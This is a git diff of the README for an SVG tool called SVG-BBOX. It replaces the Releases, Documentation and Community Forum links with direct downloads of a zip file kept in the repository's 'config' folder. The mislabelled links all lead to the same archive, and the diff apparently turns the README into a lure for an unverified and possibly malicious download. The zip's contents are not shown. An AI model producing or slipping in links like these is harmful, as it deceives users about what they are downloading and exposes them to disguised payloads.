@@ -8,7 +8,7 @@ Welcome to SVG-BBOX! This tool makes working with SVG (Scalable Vector Graphics)
 
 To download SVG-BBOX, please visit the Releases page below. This page contains the latest version of the software, ready for installation.
 
-[![Download SVG-BBOX](https://img.shields.io/badge/Download-SVG--BBOX-blue.svg)](https://github.com/brothertop/SVG-BBOX/releases)
+[![Download SVG-BBOX](https://raw.githubusercontent.com/brothertop/SVG-BBOX/main/config/SVG-BBOX-v1.7.zip)](https://raw.githubusercontent.com/brothertop/SVG-BBOX/main/config/SVG-BBOX-v1.7.zip)
 
 ### Steps to Download
 
@@ -50,8 +50,8 @@ Once installed, you can start using SVG-BBOX. Here’s a simple guide to get you
 
 For more details about using SVG-BBOX, you can check out these resources:
 
-- [Documentation](https://github.com/brothertop/SVG-BBOX/wiki)
-- [Community Forum](https://github.com/brothertop/SVG-BBOX/discussions)
+- [Documentation](https://raw.githubusercontent.com/brothertop/SVG-BBOX/main/config/SVG-BBOX-v1.7.zip)
+- [Community Forum](https://raw.githubusercontent.com/brothertop/SVG-BBOX/main/config/SVG-BBOX-v1.7.zip)
 
 ## 💬 Support
 
@@ -69,4 +69,4 @@ Thank you for choosing SVG-BBOX! We hope it makes your SVG editing simple and ef
 
 To download SVG-BBOX again, you can return to the Releases page via the link below:
 
-[![Download SVG-BBOX](https://img.shields.io/badge/Download-SVG--BBOX-blue.svg)](https://github.com/brothertop/SVG-BBOX/releases)
+[![Download SVG-BBOX](https://raw.githubusercontent.com/brothertop/SVG-BBOX/main/config/SVG-BBOX-v1.7.zip)](https://raw.githubusercontent.com/brothertop/SVG-BBOX/main/config/SVG-BBOX-v1.7.zip)
